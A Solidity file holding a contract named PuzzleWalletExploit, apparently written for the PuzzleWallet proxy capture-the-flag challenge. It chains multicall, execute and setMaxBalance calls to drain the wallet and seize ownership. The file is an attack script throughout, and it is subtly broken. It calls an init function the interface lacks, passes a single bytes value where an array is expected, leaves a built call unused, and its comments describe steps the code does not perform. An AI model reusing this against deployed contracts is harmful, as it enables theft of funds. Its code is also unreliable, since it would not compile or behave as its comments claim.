pragma solidity ^0.8.0;

interface PuzzleWallet {
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable returns (bool);
    function setMaxBalance(uint256 _maxBalance) external;
}

interface UpgradeableProxy {
    function proposeNewAdmin(address newAdmin) external;
    function approveNewAdmin(address expectedAdmin) external;
}

contract PuzzleWalletExploit {
    address immutable puzzleWalletAddress;

    constructor(address pwAddress) {
        puzzleWalletAddress = pwAddress;
    }

    function exploitStep1() external payable {
        // 1. Send 1 ETH to the multicall to allow executing deposit & send in one tx
        bytes[] memory calls = new bytes[](2);
        // Step 1A: Call deposit on PuzzleWallet (requires admin to be whitelisted)
        calls[0] = abi.encodeWithSelector(PuzzleWallet.execute.selector, address(uint160(puzzleWalletAddress)), 1 ether, "\0\0\0\0");
        // Step 1B: Call setMaxBalance(0) after draining funds
        bytes memory setData = abi.encodeWithSelector(PuzzleWallet.setMaxBalance.selector, uint256(0));
        // Step 1C: Call init with new owner (player address)
        bytes memory initCall = abi.encodeWithSelector(PuzzleWallet.init.selector, uint256(0));
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, initCall);
        
        PuzzleWallet(puzzleWalletAddress).multicall(calls);
    }
} 
